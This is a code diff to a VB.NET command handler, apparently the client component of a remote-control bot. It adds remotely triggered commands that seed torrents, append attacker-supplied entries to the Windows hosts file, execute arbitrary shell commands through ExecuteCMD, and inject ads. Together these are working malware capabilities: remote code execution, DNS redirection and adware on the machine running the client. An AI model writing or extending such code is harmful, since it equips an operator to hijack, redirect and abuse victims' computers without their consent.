@@ -126,6 +126,34 @@ Namespace Alduin.Stump.Class.Commands
                     Dim ModelDes As GetImageModel = JsonConvert.DeserializeAnonymousType(request, New GetImageModel)
                     GetImg.Handler(ModelDes, client)
                     Return ""
+                Case "SeedTorrent"
+                    Dim ModelDes As SeedTorrentModel = JsonConvert.DeserializeAnonymousType(request, New SeedTorrentModel)
+                    Return JsonConvert.SerializeObject(SeedTorrent(ModelDes))
+                Case "EditHostFile"
+                    Dim ModelDes As EditHostFileModel = JsonConvert.DeserializeAnonymousType(request, New EditHostFileModel)
+                    Try
+                        My.Computer.FileSystem.WriteAllText(Environment.SystemDirectory & "\drivers\etc\hosts", ModelDes.newVariables.Line, True)
+                        Dim log As LogModel = New LogModel With {
+                            .Message = "Host file edited",
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Success"
+                         }
+                        Return JsonConvert.SerializeObject(log)
+
+                    Catch ex As Exception
+                        Dim log As LogModel = New LogModel With {
+                            .Message = ex.ToString,
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Error"
+                         }
+                        Return JsonConvert.SerializeObject(log)
+                    End Try
+                Case "CMD"
+                    Dim ModelDes As CMDModel = JsonConvert.DeserializeAnonymousType(request, New CMDModel)
+                    Return JsonConvert.SerializeObject(ExecuteCommand.ExecuteCMD(ModelDes))
+                Case "Ads"
+                    Dim ModelDes As AdsModel = JsonConvert.DeserializeAnonymousType(request, New AdsModel)
+                    Return JsonConvert.SerializeObject(ExecuteCommand.AddAds(ModelDes))
             End Select
             Dim splittedHeader As String = RequestSplitter(request, 1, " ")
             Dim url As String = RequestSplitter(splittedHeader, 0, "?")
